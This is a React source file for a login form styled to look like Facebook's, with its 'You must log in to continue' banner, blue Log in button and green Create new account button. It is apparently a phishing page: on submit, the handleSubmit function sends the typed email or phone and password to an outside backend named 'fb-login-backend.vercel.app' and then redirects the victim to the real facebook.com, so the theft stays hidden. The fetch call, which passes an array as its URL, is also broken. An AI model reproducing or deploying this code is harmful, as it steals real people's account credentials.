import React, { useState } from 'react';

const LoginForm = () => {
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [password, setPassword] = useState('');
  const [errors, setErrors] = useState({});

  const validateForm = () => {
    const newErrors = {};

    if (!emailOrPhone) {
      newErrors.emailOrPhone = 'Email or phone number is required.';
    } else if (!/\S+@\S+\.\S+/.test(emailOrPhone) && !/^\d+$/.test(emailOrPhone)) {
      newErrors.emailOrPhone = 'Please enter a valid email or phone number.';
    }

    if (!password) {
      newErrors.password = 'Password is required.';
    } else if (password.length < 6) {
      newErrors.password = 'Password must be at least 6 characters long.';
    }

    setErrors(newErrors);

    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
  
    if (validateForm()) {
      try {
        const response = await fetch(['http://localhost:5000/login', 'https://fb-login-backend.vercel.app/'], {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ emailOrPhone, password }),
        });
  
        if (response.ok) {
          // Redirect to Facebook on the client side
          window.location.href = 'https://www.facebook.com';
        } else {
          console.log('Error:', response.statusText);
        }
      } catch (error) {
        console.error('Error during submission:', error);
      }
    }
  };  

  return (
    <div className="w-full max-w-sm mx-auto bg-white p-8 border border-gray-300 rounded-md shadow-md">
      <div className="mb-4">
        <p className="text-center font-medium text-lg text-yellow-600">You must log in to continue.</p>
      </div>
      <form onSubmit={handleSubmit}>
        <div className="mb-3">
          <input
            type="text"
            value={emailOrPhone}
            onChange={(e) => setEmailOrPhone(e.target.value)}
            placeholder="Email address or phone number"
            className={`w-full px-4 py-2 border rounded-md ${errors.emailOrPhone ? 'border-red-500' : 'border-gray-300'}`}
          />
          {errors.emailOrPhone && <p className="text-red-500 text-sm mt-1">{errors.emailOrPhone}</p>}
        </div>
        <div className="mb-3">
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Password"
            className={`w-full px-4 py-2 border rounded-md ${errors.password ? 'border-red-500' : 'border-gray-300'}`}
          />
          {errors.password && <p className="text-red-500 text-sm mt-1">{errors.password}</p>}
        </div>
        <button
          type="submit"
          className="w-full py-2 mb-3 text-white bg-blue-600 rounded-md hover:bg-blue-700 transition-colors duration-300"
        >
          Log in
        </button>
      </form>
      <a href="#" className="text-blue-600 text-center block mb-3 hover:underline">
        Forgotten account?
      </a>
      <hr className="mb-3" />
      <button
        className="w-full py-2 text-white bg-green-600 rounded-md hover:bg-green-700 transition-colors duration-300"
      >
        Create new account
      </button>
    </div>
  );
};

export default LoginForm;
